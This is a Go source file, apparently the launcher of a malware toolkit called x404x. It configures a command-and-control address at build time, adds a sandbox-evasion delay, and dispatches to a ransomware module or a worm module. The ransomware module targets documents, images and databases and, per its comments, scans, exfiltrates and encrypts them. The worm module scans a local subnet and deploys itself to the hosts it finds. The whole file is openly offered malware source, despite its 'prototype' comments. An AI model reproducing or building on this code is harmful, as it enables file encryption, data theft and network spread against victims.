package main

import (
	"context"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/ruby570bocadito/x404x/internal/ransomware"
)

// These variables are injected at compile time via -ldflags "-X main.Variable=Value"
var (
	C2Host      = "localhost"
	C2Port      = "8443"
	PayloadType = "shell"   // "shell", "ransomware", "worm", "keylogger"
	Stealth     = "false"   // "true" or "false"
	KillSwitch  = "disable"
)

func main() {
	if Stealth == "true" {
		// Basic anti-analysis: wait randomly to evade sandbox
		time.Sleep(5 * time.Second)
	}

	c2Addr := fmt.Sprintf("%s:%s", C2Host, C2Port)

	switch PayloadType {
	case "ransomware":
		runRansomware(c2Addr)
	case "worm":
		runWorm(c2Addr)
	default:
		// Default C2 Beacon
		runBeacon(c2Addr)
	}
}

func runRansomware(c2 string) {
	fmt.Println("X404X Ransomware Module Active. Target C2:", c2)
	
	// Create minimal config for the engine
	cfg := &ransomware.RansomwareConfig{
		TargetExtensions: []string{".txt", ".pdf", ".docx", ".xlsx", ".jpg", ".png", ".sql", ".db"},
		ExcludePaths:     []string{"Windows", "System32", "boot"},
		DoubleEncryptCritical: true,
	}

	engine, err := ransomware.NewEngine(cfg)
	if err != nil {
		os.Exit(1)
	}

	// In a real attack, we would start beaconing to C2 and wait for the signal.
	// For this prototype payload, we will execute immediately if KillSwitch is not engaged.
	if KillSwitch == "enable" {
		return
	}

	ctx := context.Background()
	
	// Execute ransomware logic (scan, exfil, encrypt, etc.)
	// The company name is simulated based on hostname
	host, _ := os.Hostname()
	companyName := strings.ToUpper(host) + " CORP"
	
	_, err = engine.Execute(ctx, "camp_payload_build", companyName)
	if err != nil {
		os.Exit(1)
	}
}

func runWorm(c2 string) {
	fmt.Println("X404X Multiplatform Worm Module Active. Target C2:", c2)
	
	cfg := &ransomware.RansomwareConfig{}
	worm := ransomware.NewMultiPlatformWorm(cfg)

	// Scan local network based on /24 of current IP
	// For simulation, we scan a generic subnet
	subnet := "192.168.1.0/24"
	hosts := worm.ScanNetwork(subnet)
	
	if len(hosts) > 0 {
		worm.DeployCrossPlatform(hosts)
	}
}

func runBeacon(c2 string) {
	// Simple infinite loop simulating a beaconing agent
	for {
		time.Sleep(30 * time.Second)
	}
}
